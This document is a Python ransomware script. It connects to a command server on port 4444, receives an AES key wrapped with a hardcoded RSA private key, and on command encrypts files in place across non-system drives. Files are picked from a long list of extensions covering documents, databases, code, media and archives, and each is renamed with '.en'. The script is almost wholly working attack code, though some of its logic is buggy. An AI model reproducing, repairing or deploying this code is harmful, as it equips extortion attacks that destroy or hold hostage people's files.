from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter
from Crypto.PublicKey import RSA
from Crypto import Random
import socket
from time import sleep
import threading
import optparse
import os
import sys


def encryption(key, o_file):
    counter = Counter.new(128)
    s = AES.new(key, AES.MODE_CTR, counter=counter)
    block_size = 16
    with open(o_file, 'r+b')as f:
        plaintext = f.read(block_size)
        while plaintext:
            f.seek(-len(plaintext), 1)
            f.write(s.encrypt(plaintext))
            plaintext = f.read(block_size)
        f.close()
        os.rename(o_file, o_file + '.en')


def decryption(key, d_file):
    counter = Counter.new(128)
    s = AES.new(key, AES.MODE_CTR, counter=counter)
    block_size = 16
    with open(d_file, 'r+b')as f:
        ciphertext = f.read(block_size)
        while ciphertext:
            f.seek(-len(ciphertext), 1)
            f.write(s.decrypt(ciphertext))
            ciphertext = f.read(block_size)
        f.close()
        os.rename(d_file, d_file.strip('.en'))


def server():
    try:
        private_key = """-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAjOBefeyUpBILyoJGxlNMcpykg2MrU7K2rzKKGZkX2sEsHNe5
Z+UEl0UOneX+UWYexzJWJaZjNg0983kZXEKxlZatK6nk5eEFpQqE3fteKWBc+Kdf
otspcQ64zR38Q6wOgse40eWRV4Fv6Lu7LeUbN7Nd4Jm8t/ACXxPLwy08K2PA4DO/
5AL8Obu3LR6Sf3EE0og/hbHMfFKSBbKVG0/PM9FiXAwbBYvQnbcxyfzf8BT167s1
TLQckNWZoU8l/es0Ze56+4ZwoOTd6ffyiZCtogyH0Cm40M2k6c70n5L8G+SIU0fd
10goXWpytXofNJCGJVaTyDmcpMZ+y5jj2zzFwwIDAQABAoIBACcwVzjicir+Fiec
fAG5tF+BscYW9TuQUH+GKKKcUuV4rUPMwvfi3pcSD9He5BNSvCcfmpVYpuqnXl93
hZWDvBDn3H50AYftQ/u4ZGO4BGawNsy5CsKsAug/dysgN0e/+j1pP8GsAfV8vVvZ
tWU8AYlKLUhInBXy/0XhpOJDmCRdbtklnPSvnxQ5cOKiz6giBuX8t20/9OWgs4Wi
kDWZWuwgFUuyLCpWaG9PCaJucPDjO8KC6t5IrvHXIgvzcdazWoHT/qvhe9JbXD67
brLj8mjOIfPHqhMOX8m9OYfjCaXEOtfeWkyWeGzbr4rRoPxAZKgYUb0Zxk7TbLy2
0c7eYukCgYEAt/H4bQ++VvU6mBTcrrE7xOg+tUF6nDyWsU5AfwTVzJ2HfGNrdRqU
4UodZfIgtp0jv8xJtduedR57bdkCQYl58+x1/c2Zdg5Rmzdq114fKWMRcMNgdORL
U6vlG3NjvhYkAzLupozMXO5VbSwLOd9+Otzp11+K88KyxD5I2VCWEWUCgYEAxA92
c/pphfEoX9dmzV39GF9nMOdO50OvctGsyLphkdZDlmmIZkWyMDf8zqxQjOtdqbE0
OifVbDXJtVY66+xUltSRdnR8EjUfgPVeHZD8eOAekEahcbgDgY8P5f3LuBB7WsKd
g5UB/njW+nbzlOMkrSYe1Uys3uFZwyv+YSg6XAcCgYBH5ywm5aqPr1hyLmV9XAZz
GB27GJdnD0AQmvgXLrqsOz/E3dAZfISJ9EC9owIqoA5jYOXHUswEGCBDdjqth6HG
Ob59saq1PS+lLupyuXYQ5Yrhu12vE7ZmRKFQM7DfkyQMpBIpxIv2H6wA+uCAhN6A
/+3gpJZaZtceYwJzAE9JCQKBgHWiuXXY99uP2KO4wEvUavlmtKmY/7Su3eRMfhlq
CwTPxHnJFDgY9VMNJLh0l1gWGHqqgiWqpNlqZH5TIMNRZ2egXy7tsUvTZ/WeQzwG
NBXqkywJ1PBAcooX5ngekU79RKYuQwgiLbIbmxFosbnRl730M2fTu513JL5/9P8i
ffGdAoGBALA/AVU3mc6LR04RinruyH41QODxp8jBqKKK53Ok4xIMHYOCvytSMnSr
bSMfH2w7ZG0oUdHUAodsFABxYKCte1Of/81w9cvoE28CrhQP/cPO/ocIOb6VqFtG
Pvvk0KaqjuXms7wJed9ZhIhcp4CL+oyyqIVzMNn9PY8Whpkvy5Vh
-----END RSA PRIVATE KEY-----"""
        pr = RSA.importKey(private_key)
        de_key = PKCS1_OAEP.new(pr)
        host, port = '127.0.0.1', 4444
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        dec = s.recv(2048)
        padding = lambda x: x + (16 - len(x) % 16) * '#'
        key = padding(de_key.decrypt(dec).decode('ascii'))
        key = key.encode('ascii')
        while True:
            command = s.recv(2048)
            command = command.decode('ascii')
            if command == 'de' or sys.argv[0] == "de":
                files = win_partion()
                s.send(b'\n starting process \n ')
                for i in files:
                    decryption(key, i)
            elif command == 'en' or sys.argv[0] == "en":
                files = win_partion()
                s.send(b'starting Encrypted\n')
                for i in files:
                    s.send(b'\n \t  Done! Encrypt \n ')
                    encryption(key, i)
                s.send(b'\n Done! Decrypt')
            elif command == 'stop' or 'exit':
                s.send(b'\n \t "Exit Now "  \n')
                break
    except socket.error as e:
        print(e)
        s.close()
        sleep(1)
        server()


def win_partion():
    extensions = [
        'exe', 'dll', 'py', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES [danger]
        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',  # OpenOffice, Adobe, Latex, Markdown, etc
        ' yml', 'yaml', 'json', 'xml', 'csv',  # structured data
        'db', 'sql', 'dbf', 'mdb', 'iso',  # databases and disc images
        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # web technologies
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
        'java', 'class', 'jar',  # java source code
        'ps', 'bat', 'vb',  # windows based scripts
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # linux/mac based scripts
        'go', 'py', 'pyc', 'bf', 'coffee',  # other source code files
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # images
        'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # music and sound
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Video and movies
        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak', 'en'
    ]

    env = sys.platform
    if env == 'win32':
        path = x = win_dirs()
        fd = []
        for d, sd, f in os.walk(path):
            for file_name in f:
                full_path = os.path.join(d, file_name)
                ex = full_path.split(".")[-1]
                if ex in extensions:
                    fd.append(full_path)
                    print(full_path)
        return fd


def win_dirs():
    partions = []
    for i in range(65, 91):
        par = chr(i) + '://'
        if os.path.exists(par):
            if 'C://' in  par :continue
            partions.append(par)
    print(partions)


def dirs_linux():
    linux_par = [
        '/dev/sda1',
        '/dev/sda2',
        '/dev/sda3',
        '/dev/sda4',
        '/dev/sda5',
        '/dev/sda6',
        '/dev/sda7',
        '/dev/sda8',
    ]
if __name__ == "__main__":
    server()